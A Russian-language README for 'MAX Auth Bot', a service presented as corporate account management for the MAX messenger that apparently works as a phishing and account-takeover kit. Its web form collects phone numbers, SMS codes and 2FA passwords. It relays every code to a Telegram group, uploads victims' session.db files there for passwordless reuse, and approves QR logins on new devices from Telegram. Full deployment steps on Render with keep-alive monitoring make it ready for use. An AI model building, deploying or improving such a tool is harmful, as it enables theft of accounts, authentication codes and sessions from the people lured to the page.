# MAX Auth Bot

Сервис для управления корпоративными аккаунтами в мессенджере **MAX**:
- 🌐 Отдаёт веб-страницу для авторизации сотрудников
- 🔑 Логирует все коды подтверждения в Telegram-группу
- 💾 Бэкапит сессии (`session.db`) в Telegram и восстанавливает их при перезапуске
- 📱 Поддерживает вход в MAX на новом устройстве через QR-код

---

## 📋 Возможности

| Функция | Описание |
|---|---|
| **Веб-форма входа** | Сотрудник вводит телефон, код и (при наличии) пароль 2FA прямо на сайте |
| **Логирование в TG** | Все события — старт сервера, коды, ошибки, входы — уходят в Telegram-группу |
| **Бэкап сессий** | После успешного входа `session.db` отправляется в TG как документ |
| **Восстановление сессий** | При перезапуске сервер скачивает последнюю сессию из TG — вход без кода и пароля |
| **QR-вход** | Скриншот QR с `web.max.ru` → отправка в TG → выбор аккаунта → подтверждение входа |
| **Автоматический редирект** | После успешного входа — переход на канал компании |

---

## 🛠 Требования

- **Python 3.10+**
- **Telegram-бот** (токен от [@BotFather](https://t.me/BotFather))
- **Telegram-группа** с ботом в качестве участника (для логов и сессий)
- **Аккаунт MAX** с доступом к номеру телефона

## 🚀 Быстрый старт (локально)

### 1. Клонировать проект

```bash
git clone <твой-репозиторий>
cd max-auth-bot
```

### 2. Создать виртуальное окружение

**Windows:**
```bash
python -m venv venv
venv\Scripts\activate
```

**macOS / Linux:**
```bash
python3 -m venv venv
source venv/bin/activate
```

### 3. Установить зависимости

```bash
pip install -U -r requirements.txt
```

> **Windows:** если `pyzbar` не импортируется, установи [Visual C++ Redistributable x64](https://aka.ms/vs/17/release/vc_redist.x64.exe) и перезагрузись.

### 4. Создать `.env`

Создай файл `.env` (ровно с точкой в начале, **без `.txt`**) в корне проекта:

```env
TG_TOKEN=123456789:AA...твой_токен
TG_CHAT_ID=-1001234567890
REDIRECT_URL=https://max.ru/твой-канал
HTTP_HOST=0.0.0.0
HTTP_PORT=8080
```

| Переменная | Что это | Где взять |
|---|---|---|
| `TG_TOKEN` | Токен Telegram-бота | [@BotFather](https://t.me/BotFather) → `/newbot` |
| `TG_CHAT_ID` | ID группы для логов (отрицательный) | [@userinfobot](https://t.me/userinfobot) |
| `REDIRECT_URL` | Куда редиректить после входа | Ссылка на канал MAX |
| `HTTP_PORT` | Порт локального сервера | Любой свободный (8080 по умолчанию) |

### 5. Запустить

```bash
python app.py
```

Должно вывести:
```
2026-09-30 12:00:00 | INFO | root | Запуск сервиса…
2026-09-30 12:00:00 | INFO | root | HTTP сервер запущен на http://0.0.0.0:8080
2026-09-30 12:00:00 | INFO | root | Telegram polling запущен (offset=0)
```

### 6. Открыть сайт

Браузер → `http://localhost:8080`

## 🌐 Деплой на Render (бесплатно)

### Шаг 1. Загрузить проект на GitHub

```bash
git init
git add .
git commit -m "Initial commit"
git remote add origin https://github.com/твой-логин/max-auth-bot.git
git push -u origin main
```

> ⚠️ **Проверь `.gitignore`** — `.env` и `cache/` не должны попасть в репозиторий.

### Шаг 2. Создать Web Service на Render

1. Зарегистрируйся на [render.com](https://render.com) через GitHub.
2. **New +** → **Web Service**.
3. Подключи репозиторий `max-auth-bot`.
4. Заполни:
   - **Name**: `max-auth-bot`
   - **Region**: Frankfurt (или ближайший)
   - **Branch**: `main`
   - **Runtime**: `Python 3`
   - **Build Command**: `pip install -r requirements.txt`
   - **Start Command**: `python app.py`
   - **Instance Type**: **Free**

5. **Environment Variables** — добавь:
   - `TG_TOKEN` = твой токен
   - `TG_CHAT_ID` = id группы
   - `REDIRECT_URL` = ссылка на канал

6. **Create Web Service**.

Render соберёт и запустит сервис. Через 2–5 минут появится URL вида:
```
https://max-auth-bot-xxxx.onrender.com
```

### Шаг 3. Настроить UptimeRobot (чтобы Render не засыпал)

1. Зарегистрируйся на [uptimerobot.com](https://uptimerobot.com).
2. **Add New Monitor**:
   - **Type**: `HTTP(s)`
   - **Friendly Name**: `MAX Auth Bot`
   - **URL**: `https://max-auth-bot-xxxx.onrender.com/health`
   - **Interval**: `5 minutes`
3. **Create Monitor**.

Теперь сервис не будет останавливаться из-за простоя.

## 📖 Использование

### Обычный вход (через сайт)

1. Открой сайт (`http://localhost:8080` или Render URL).
2. Введи номер телефона → **Получить код**.
3. В TG-группе появится лог: `Запрос SMS для +7...`
4. Введи код из SMS (или из сообщения MAX).
5. Если включён 2FA — введи пароль.
6. После успеха — редирект на канал компании.

**Что появится в TG-группе:**
```
2026-09-30 15:00:05 | INFO | [+79990000001] ✅ Вход. Клиент в сети, слушаю входящие.
2026-09-30 15:00:06 | INFO | [+79990000001] Сессия отправлена в TG
📎 session_79990000001.db
```

### QR-вход (на новом устройстве)

1. На новом устройстве открой `https://web.max.ru`.
2. Появится **QR-код** для входа.
3. **Сделай скриншот** этого QR.
4. Отправь скриншот в TG-группу **как файл** (📎 → **Файл** — так Telegram не сожмёт картинку и QR распознается).
5. Бот пришлёт:
   ```
   🔐 Найден QR для входа в MAX
   Выберите аккаунт:
   [📱 +79990000001]
   [📱 +79990000002]
   [❌ Отмена]
   ```
6. Нажми на нужный аккаунт.
7. Бот подтвердит вход — новое устройство войдёт в MAX.

> ⚠️ QR-код на `web.max.ru` **обновляется каждые 60 секунд**. Если не успел — сделай новый скриншот.

### Восстановление сессии после перезапуска

Если сервер перезапустился (или ты переехал на другой хостинг):
1. При следующем входе на сайте сервер проверит `cache/<phone>/session.db`.
2. Если файла нет — скачает последний `session_<phone>.db` из TG-группы.
3. Восстановит сессию и войдёт **без кода и пароля**.

## 🔌 API

Сервер предоставляет три эндпоинта для формы на сайте.

### `POST /api/auth/send-code`

Запрос SMS-кода для входа.

```json
// Request
{ "phone": "+79990000001" }

// Response
{ "ok": true }
```

### `POST /api/auth/submit-code`

Отправка кода подтверждения.

```json
// Request
{ "phone": "+79990000001", "code": "4821" }

// Response (успех без 2FA)
{ "ok": true, "redirect": "https://max.ru/..." }

// Response (нужен пароль 2FA)
{ "ok": true, "needs_password": true }

// Response (ошибка)
{ "ok": false, "error": "Неверный код" }
```

### `POST /api/auth/submit-password`

Отправка пароля 2FA.

```json
// Request
{ "phone": "+79990000001", "password": "qwerty" }

// Response
{ "ok": true, "redirect": "https://max.ru/..." }
```

### `GET /health`

Проверка что сервер жив.

```json
{ "status": "ok" }
```

## 🔐 Безопасность

- **Никогда не коммить `.env`** — там токен бота.
- **Репозиторий делай приватным** — в `cache/` могут быть сессии.
- **TG-группа должна быть приватной** — там сессии и коды.
- **Не передавай `session.db` третьим лицам** — это полный доступ к аккаунту.
- **HTTPS** — Render даёт его автоматически, локально для тестов хватит HTTP.

## ⚠️ Ограничения и предупреждения

1. **PyMax использует неофициальный API MAX.** Авторы библиотеки предупреждают, что это может нарушать условия сервиса и привести к блокировке аккаунтов. Используй на свой риск.

2. **SMS на первом входе.** При первой авторизации MAX всегда шлёт код по SMS (не в приложение). Это связано с тем, что `pymax` подключается как новое устройство.

3. **Rate limit Telegram.** 20 сообщений в минуту в одну группу. Если сотрудников много и они логинятся одновременно — часть логов может потеряться.

4. **Render Free засыпает** без трафика. UptimeRobot пингует `/health` каждые 5 минут — это предотвращает сон.

5. **Постоянное хранилище.** На Render Free нет persistent disk. Папка `cache/` очищается при перезапуске — поэтому и нужен бэкап сессий в TG.

6. **Регулярка для QR.** Бот ищет QR-ссылку по паттерну `https?://\S+` в тексте или декодирует QR из картинки. Если MAX поменяет формат — возможно, понадобится правка.

## 🐛 Решение проблем

| Проблема | Причина | Решение |
|---|---|---|
| `TG_TOKEN / TG_CHAT_ID не заданы` | Файл `.env` называется `.env.txt` | Переименуй в `.env` |
| `chat not found` | Неверный `TG_CHAT_ID` или бот не в группе | Проверь через [@userinfobot](https://t.me/userinfobot) |
| `Не удалось распознать QR` | OpenCV/pyzbar не видят QR | Отправь скриншот как **файл** (не фото) |
| `Нет активных аккаунтов` | Ни один клиент не в сети | Сначала войди через сайт |
| `authorize_qr_login` вернул `False` | QR протух (живёт 60 сек) | Сделай свежий скриншот |
| `Conflict: terminated by other getUpdates` | Запущено два процесса с одним ботом | Убей лишний |
| Сессия не восстанавливается из TG | Бот не видел `sendDocument` (не в группе или удалили) | Проверь логи в TG |
| `pyzbar` не импортируется (Windows) | Нет Visual C++ Redistributable | Установи [VC++ x64](https://aka.ms/vs/17/release/vc_redist.x64.exe) |
